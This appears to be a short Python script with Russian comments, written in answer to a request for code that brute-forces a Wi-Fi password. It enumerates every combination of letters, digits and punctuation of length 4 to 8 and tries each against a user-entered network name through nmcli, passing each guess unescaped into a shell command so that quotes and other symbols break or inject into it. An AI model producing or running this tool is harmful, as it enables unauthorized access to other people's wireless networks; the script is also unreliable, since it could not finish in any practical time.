#20250827
#С помощью Python написать код подбора пароля к Wi-Fi с помощью алфавита и спецсимволов

import os
import itertools
import string
import time

def connect_to_wifi(ssid, password):
    try:
        # Попытка подключения через nmcli
        result = os.system(f'nmcli d wifi connect "{ssid}" password "{password}"')
        if result == 0:
            return True
        return False
    except Exception as e:
        print(f"Ошибка подключения: {e}")
        return False

def generate_passwords(length):
    # Создаем набор символов: буквы, цифры и спецсимволы
    characters = string.ascii_letters + string.digits + string.punctuation
    for combo in itertools.product(characters, repeat=length):
        yield ''.join(combo)

def brute_force_wifi(ssid, min_length=4, max_length=8):
    for length in range(min_length, max_length + 1):
        print(f"Проверяем пароли длиной {length} символов")
        for password in generate_passwords(length):
            print(f"Пробуем пароль: {password}")
            if connect_to_wifi(ssid, password):
                print(f"Успешное подключение! Пароль: {password}")
                return
            time.sleep(0.95)  # Задержка между попытками
    print("Пароль не найден")

if __name__ == "__main__":
    try:
        ssid = input("Введите имя Wi-Fi сети (SSID): ")
        brute_force_wifi(ssid)
    except KeyboardInterrupt:
        print("\nРабота программы прервана пользователем")
